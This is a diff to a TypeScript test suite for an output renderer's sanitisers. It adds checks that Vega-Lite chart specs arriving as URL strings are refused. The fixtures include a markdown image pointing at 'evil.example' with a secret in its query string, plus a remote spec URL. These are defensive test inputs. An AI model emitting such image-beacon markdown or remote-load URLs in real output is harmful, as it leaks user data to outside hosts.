@@ -11,7 +11,7 @@ import { Output } from '../../src/components/Outputs.tsx'
 import { ChatMarkdown } from '../../src/chat/markdown.tsx'
 import { isLocalUrl, purifyHtml, purifySvg, styleReachesOut } from '../../src/lib/sanitize.ts'
 import { inlineSvg, rootDecls } from '../../src/lib/svg.ts'
-import { dataOnly, withoutEmbedOptions } from '../../src/lib/vegaLoader.ts'
+import { dataOnly, specObject, withoutEmbedOptions } from '../../src/lib/vegaLoader.ts'
 import { parseInline } from '../../src/report/inlineParse.ts'
 import { mount, settle, unmountAll } from './mount.tsx'
 
@@ -126,6 +126,15 @@ describe('svg output', () => {
   })
 })
 
+describe('vega output', () => {
+  test('a spec that arrives as a string naming a URL is refused, never loaded', async () => {
+    const el = await mount(<Output bundle={{ 'application/vnd.vegalite.v5+json': 'data:application/json,{"mark":"bar","usermeta":{"embedOptions":{}}}' }} />)
+    await settle()
+    expect(el.querySelector('.outputs-error')?.textContent).toMatch(/not a JSON object/)
+    expect(el.querySelector('svg, canvas')).toBeNull()
+  })
+})
+
 describe('markdown', () => {
   const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media/a.png)'
 
@@ -170,6 +179,13 @@ describe('the pure checks', () => {
     expect(withoutEmbedOptions({ mark: 'bar', usermeta: { embedOptions: { loader: {} }, note: 1 } })).toEqual({ mark: 'bar', usermeta: { note: 1 } })
     const plain = { mark: 'bar' }
     expect(withoutEmbedOptions(plain)).toBe(plain)
+  })
+
+  test('a chart spec is a plain object: a JSON string is parsed, a URL or anything else is refused', () => {
+    const spec = { mark: 'bar', usermeta: { embedOptions: { loader: {} } } }
+    expect(specObject(spec)).toBe(spec)
+    expect(specObject(JSON.stringify(spec))).toEqual(spec)
+    for (const bad of ['data:application/json,{"mark":"bar"}', 'https://evil.example/spec.json', '[1]', 'null', [spec], null, 3, new Date()]) expect(specObject(bad), String(bad)).toBeNull()
   })
 
   test("a report sentence's link keeps http:, https: and mailto: only; any other scheme stays text", () => {
